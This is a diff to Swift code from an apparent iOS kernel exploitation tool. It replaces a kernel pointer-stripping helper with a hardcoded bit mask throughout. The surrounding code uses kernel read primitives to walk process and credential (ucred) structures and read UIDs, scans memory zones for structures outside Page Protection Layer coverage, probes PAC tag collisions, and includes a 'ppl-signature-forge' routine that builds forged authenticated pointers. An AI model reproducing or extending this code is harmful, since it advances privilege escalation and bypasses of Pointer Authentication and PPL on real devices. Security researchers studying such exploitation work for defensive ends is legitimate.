@@ -422,7 +422,7 @@ private func _regPPL() {
         guard our_proc != 0 else { return .fail("ppl-signature-forge: ds_get_our_proc() = 0") }
 
         let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
-        let stripped_proc_ro = kptr_strip_data(raw_proc_ro)
+        let stripped_proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
         guard stripped_proc_ro != 0 else {
             return .fail("ppl-signature-forge: proc_ro stripped = 0 — pointer unreadable or null")
         }
@@ -450,7 +450,7 @@ private func _regPPL() {
         let forged_ptr = scratch | pac_tag
 
         let raw_ucred = ds_kread64(stripped_proc_ro + off_proc_ro_p_ucred)
-        let stripped_ucred = kptr_strip_data(raw_ucred)
+        let stripped_ucred = raw_ucred & 0x0000000FFFFFFFFF
         let current_uid = ds_kread32(stripped_ucred + 0x18)
 
         return .ok(String(format:
@@ -594,7 +594,7 @@ private func _regPPLHunter() {
         let our_proc = ds_get_our_proc()
         if our_proc != 0 && off_proc_p_proc_ro > 0 {
             let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
-            let proc_ro = kptr_strip_data(raw_proc_ro)
+            let proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
             if proc_ro != 0 {
                 report.append(_hunterPTEWalker(targetVA: proc_ro, label: "proc_ro"))
                 report.append("")
@@ -603,10 +603,10 @@ private func _regPPLHunter() {
 
         if our_proc != 0 && off_proc_p_proc_ro > 0 && off_proc_ro_p_ucred > 0 {
             let raw_proc_ro = ds_kread64(our_proc + off_proc_p_proc_ro)
-            let proc_ro = kptr_strip_data(raw_proc_ro)
+            let proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
             if proc_ro != 0 {
                 let raw_ucred = ds_kread64(proc_ro + off_proc_ro_p_ucred)
-                let ucred = kptr_strip_data(raw_ucred)
+                let ucred = raw_ucred & 0x0000000FFFFFFFFF
                 if ucred != 0 {
                     report.append(_hunterPTEWalker(targetVA: ucred, label: "ucred"))
                     report.append("")
@@ -647,14 +647,14 @@ private func _hunterZoneScan() -> String {
         seen += 1
 
         let raw_proc_ro = ds_kread64(proc + off_proc_p_proc_ro)
-        let proc_ro = kptr_strip_data(raw_proc_ro)
+        let proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
         let pid = Int32(ds_kread32(proc + off_proc_p_pid))
 
         var ucred: UInt64 = 0
         var uid: UInt32 = 0xFFFFFFFF
         if proc_ro != 0 && off_proc_ro_p_ucred > 0 {
             let raw_ucred = ds_kread64(proc_ro + off_proc_ro_p_ucred)
-            ucred = kptr_strip_data(raw_ucred)
+            ucred = raw_ucred & 0x0000000FFFFFFFFF
             if ucred != 0 && _isNonPPL(ucred) {
                 uid = ds_kread32(ucred + 0x18)
             }
@@ -672,7 +672,7 @@ private func _hunterZoneScan() -> String {
         }
 
         let next_raw = ds_kread64(proc + off_proc_p_list_le_next)
-        let next = kptr_strip_data(next_raw)
+        let next = next_raw & 0x0000000FFFFFFFFF
         if next == proc || next == 0 { break }
         proc = next
     }
@@ -723,9 +723,9 @@ private func _hunterForkProbe() -> String {
     }
 
     let raw_ro = ds_kread64(child_proc + off_proc_p_proc_ro)
-    let child_ro = kptr_strip_data(raw_ro)
+    let child_ro = raw_ro & 0x0000000FFFFFFFFF
     let raw_uc = child_ro != 0 ? ds_kread64(child_ro + off_proc_ro_p_ucred) : 0
-    let child_ucred = kptr_strip_data(raw_uc)
+    let child_ucred = raw_uc & 0x0000000FFFFFFFFF
 
     let roZone = _isNonPPL(child_ro) ? "NON-PPL ✓" : (_isPPLZone(child_ro) ? "PPL ✗" : "UNKNOWN")
     let ucZone = _isNonPPL(child_ucred) ? "NON-PPL ✓" : (_isPPLZone(child_ucred) ? "PPL ✗" : "UNKNOWN")
@@ -811,7 +811,7 @@ private func _hunterPACCollision() -> String {
             let ptrs = tagToPtrs[tag]!
             lines.append(String(format: "  ⚠ COLLISION: tag=0x%016llx appears %d times", tag, count))
             for p in ptrs {
-                lines.append(String(format: "    ptr=0x%016llx → stripped=0x%016llx", p, kptr_strip_data(p)))
+                lines.append(String(format: "    ptr=0x%016llx → stripped=0x%016llx", p, p & 0x0000000FFFFFFFFF))
             }
         }
     }
